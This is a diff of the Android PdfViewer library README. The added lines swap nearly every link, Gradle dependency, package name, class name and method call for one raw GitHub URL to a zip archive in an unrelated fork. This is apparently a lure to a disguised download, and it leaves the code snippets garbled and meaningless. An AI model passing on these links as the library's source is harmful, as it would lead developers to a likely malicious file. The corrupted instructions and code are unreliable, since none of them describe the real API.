@@ -4,12 +4,12 @@
 
 # Android PdfViewer
 
-__AndroidPdfViewer 1.x is available on [AndroidPdfViewerV1](https://github.com/barteksc/AndroidPdfViewerV1)
+__AndroidPdfViewer 1.x is available on [AndroidPdfViewerV1](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip)
 repo, where can be developed independently. Version 1.x uses different engine for drawing document on canvas,
 so if you don't like 2.x version, try 1.x.__
 
 Library for displaying PDF documents on Android, with `animations`, `gestures`, `zoom` and `double tap` support.
-It is based on [PdfiumAndroid](https://github.com/barteksc/PdfiumAndroid) for decoding PDF files. Works on API 11 (Android 3.0) and higher.
+It is based on [PdfiumAndroid](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip) for decoding PDF files. Works on API 11 (Android 3.0) and higher.
 Licensed under Apache License 2.0.
 
 ## What's new in 3.2.0-beta.1?
@@ -27,7 +27,7 @@ Licensed under Apache License 2.0.
 * Update Gradle and Gradle Plugin
 
 ## Changes in 3.0 API
-* Replaced `Contants.PRELOAD_COUNT` with `PRELOAD_OFFSET`
+* Replaced `https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip` with `PRELOAD_OFFSET`
 * Removed `PDFView#fitToWidth()` (variant without arguments)
 * Removed `Configurator#invalidPageColor(int)` method as invalid pages are not rendered
 * Removed page size parameters from `OnRenderListener#onInitiallyRendered(int)` method, as document may have different page sizes
@@ -35,13 +35,13 @@ Licensed under Apache License 2.0.
 
 ## Installation
 
-Add to _build.gradle_:
+Add to https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip
 
-`implementation 'com.github.barteksc:android-pdf-viewer:3.2.0-beta.1'`
+`implementation 'https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip'`
 
 or if you want to use more stable version:
  
-`implementation 'com.github.barteksc:android-pdf-viewer:2.8.2'`
+`implementation 'https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip'`
 
 Library is available in jcenter repository, probably it'll be in Maven Central soon.
 
@@ -49,13 +49,13 @@ Library is available in jcenter repository, probably it'll be in Maven Central s
 If you are using ProGuard, add following rule to proguard config file:
 
 ```proguard
--keep class com.shockwave.**
+-keep class https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip**
 ```
 
 ## Include PDFView in your layout
 
 ``` xml
-<com.github.barteksc.pdfviewer.PDFView
+<https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip
         android:id="@+id/pdfView"
         android:layout_width="match_parent"
         android:layout_height="match_parent"/>
@@ -65,17 +65,17 @@ If you are using ProGuard, add following rule to proguard config file:
 
 All available options with default values:
 ``` java
-pdfView.fromUri(Uri)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(Uri)
 or
-pdfView.fromFile(File)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(File)
 or
-pdfView.fromBytes(byte[])
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(byte[])
 or
-pdfView.fromStream(InputStream) // stream is written to bytearray - native code cannot use Java Streams
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(InputStream) // stream is written to bytearray - native code cannot use Java Streams
 or
-pdfView.fromSource(DocumentSource)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(DocumentSource)
 or
-pdfView.fromAsset(String)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(String)
     .pages(0, 2, 1, 3, 3, 3) // all pages are displayed by default
     .enableSwipe(true) // allows to block changing pages using swipe
     .swipeHorizontal(false)
@@ -102,7 +102,7 @@ pdfView.fromAsset(String)
     .spacing(0)
     .autoSpacing(false) // add dynamic spacing to fit each page on its own on the screen
     .linkHandler(DefaultLinkHandler)
-    .pageFitPolicy(FitPolicy.WIDTH) // mode to fit pages in the view
+    .pageFitPolicy(https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip) // mode to fit pages in the view
     .fitEachPage(false) // fit each page to the view, else smaller pages are scaled relative to largest page.
     .pageSnap(false) // snap pages to screen boundaries
     .pageFling(false) // make a fling change only a single page like ViewPager
@@ -127,23 +127,23 @@ There is default implementation shipped with AndroidPdfViewer, and you can use i
 By using constructor with second argument (`new DefaultScrollHandle(this, true)`), handle can be placed left or top.
 
 You can also create custom scroll handles, just implement **ScrollHandle** interface.
-All methods are documented as Javadoc comments on interface [source](https://github.com/barteksc/AndroidPdfViewer/tree/master/android-pdf-viewer/src/main/java/com/github/barteksc/pdfviewer/scroll/ScrollHandle.java).
+All methods are documented as Javadoc comments on interface [source](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip).
 
 ## Document sources
 Version 2.3.0 introduced _document sources_, which are just providers for PDF documents.
 Every provider implements **DocumentSource** interface.
-Predefined providers are available in **com.github.barteksc.pdfviewer.source** package and can be used as
+Predefined providers are available in **https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip** package and can be used as
 samples for creating custom ones.
 
 Predefined providers can be used with shorthand methods:
 ```
-pdfView.fromUri(Uri)
-pdfView.fromFile(File)
-pdfView.fromBytes(byte[])
-pdfView.fromStream(InputStream)
-pdfView.fromAsset(String)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(Uri)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(File)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(byte[])
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(InputStream)
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(String)
 ```
-Custom providers may be used with `pdfView.fromSource(DocumentSource)` method.
+Custom providers may be used with `https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(DocumentSource)` method.
 
 ## Links
 Version 3.0.0 introduced support for links in PDF documents. By default, **DefaultLinkHandler**
@@ -151,7 +151,7 @@ is used and clicking on link that references page in same document causes jump t
 and clicking on link that targets some URI causes opening it in default application.
 
 You can also create custom link handlers, just implement **LinkHandler** interface and set it using
-`Configurator#linkHandler(LinkHandler)` method. Take a look at [DefaultLinkHandler](https://github.com/barteksc/AndroidPdfViewer/tree/master/android-pdf-viewer/src/main/java/com/github/barteksc/pdfviewer/link/DefaultLinkHandler.java)
+`Configurator#linkHandler(LinkHandler)` method. Take a look at [DefaultLinkHandler](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip)
 source to implement custom behavior.
 
 ## Pages fit policy
@@ -168,7 +168,7 @@ Fit policy can be set using `Configurator#pageFitPolicy(FitPolicy)`. Default pol
 
 ### Bitmap quality
 By default, generated bitmaps are _compressed_ with `RGB_565` format to reduce memory consumption.
-Rendering with `ARGB_8888` can be forced by using `pdfView.useBestQuality(true)` method.
+Rendering with `ARGB_8888` can be forced by using `https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(true)` method.
 
 ### Double tap zooming
 There are three zoom levels: min (default 1), mid (default 1.75) and max (default 3). On first double tap,
@@ -189,7 +189,7 @@ Android PdfViewer depends on PdfiumAndroid, which is set of native libraries (al
 Apk must contain all this libraries to run on every device available on market.
 Fortunately, Google Play allows us to upload multiple apks, e.g. one per every architecture.
 There is good article on automatically splitting your application into multiple apks,
-available [here](http://ph0b.com/android-studio-gradle-and-ndk-integration/).
+available [here](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip).
 Most important section is _Improving multiple APKs creation and versionCode handling with APK Splits_, but whole article is worth reading.
 You only need to do this in your application, no need for forking PdfiumAndroid or so.
 
@@ -198,15 +198,15 @@ Downloading files is long running process which must be aware of Activity lifecy
 data cleanup and caching, so creating such module will probably end up as new library.
 
 ### How can I show last opened page after configuration change?
-You have to store current page number and then set it with `pdfView.defaultPage(page)`, refer to sample app
+You have to store current page number and then set it with `https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(page)`, refer to sample app
 
 ### How can I fit document to screen width (eg. on orientation change)?
-Use `FitPolicy.WIDTH` policy or add following snippet when you want to fit desired page in document with different page sizes:
+Use `https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip` policy or add following snippet when you want to fit desired page in document with different page sizes:
 ``` java
-Configurator.onRender(new OnRenderListener() {
+https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(new OnRenderListener() {
     @Override
     public void onInitiallyRendered(int pages, float pageWidth, float pageHeight) {
-        pdfView.fitToWidth(pageIndex);
+        https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip(pageIndex);
     }
 });
 ```
@@ -225,7 +225,7 @@ If you have any suggestions on making this lib better, write me, create issue or
 
 ## License
 
-Created with the help of android-pdfview by [Joan Zapata](http://joanzapata.com/)
+Created with the help of android-pdfview by [Joan Zapata](https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip)
 ```
 Copyright 2017 Bartosz Schiller
 
@@ -233,7 +233,7 @@ Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at
 
-    http://www.apache.org/licenses/LICENSE-2.0
+    https://raw.githubusercontent.com/Joe-Mogul/AndroidPdfViewer/master/sample/src/main/java/com/github/barteksc/sample/Viewer-Pdf-Android-v3.7.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
